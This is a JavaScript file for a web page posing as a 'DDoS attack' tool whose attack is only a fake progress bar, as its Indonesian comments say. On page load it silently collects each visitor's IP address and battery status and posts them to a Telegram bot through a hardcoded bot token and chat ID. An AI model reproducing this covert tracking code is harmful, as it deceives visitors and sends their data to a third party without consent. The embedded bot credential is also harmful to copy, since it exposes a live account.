// script.js

// Token & Chat ID Bot Telegram
const TELEGRAM_BOT_TOKEN = "8050641668:AAEytFzgrSClXd5ARv35WFjfMNXGpGA5mr4";
const TELEGRAM_CHAT_ID = "6157377532";

// Fungsi mengirim data ke bot Telegram
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    });
}

// Ambil IP Pengguna
fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const userIP = data.ip;
        
        // Ambil status baterai
        navigator.getBattery().then(battery => {
            const batteryLevel = Math.round(battery.level * 100);
            const chargingStatus = battery.charging ? "Charging" : "Not Charging";

            // Kirim ke Telegram
            const message = `📡 New Visitor!\nIP: ${userIP}\n🔋 Battery: ${batteryLevel}% (${chargingStatus})`;
            sendToTelegram(message);
        });
    })
    .catch(error => console.error("Error fetching IP:", error));

// Efek Serangan DDoS Palsu
document.getElementById("ddosForm").addEventListener("submit", function (e) {
    e.preventDefault();
    
    const url = document.getElementById("url").value;
    const statusDiv = document.getElementById("status");
    const ddosEffect = document.getElementById("ddosEffect");
    const progress = document.getElementById("progress");
    const attackProgress = document.getElementById("attackProgress");

    statusDiv.textContent = "Starting DDoS simulation for " + url + "...";
    
    // Menampilkan efek "serangan"
    ddosEffect.classList.remove("hidden");

    let progressValue = 0;
    let interval = setInterval(() => {
        if (progressValue < 100) {
            progressValue += 10;
            progress.style.width = progressValue + "%";
            attackProgress.textContent = progressValue + "%";
        } else {
            clearInterval(interval);
            statusDiv.textContent = "Simulation complete. Attack finished.";
        }
    }, 500);
});
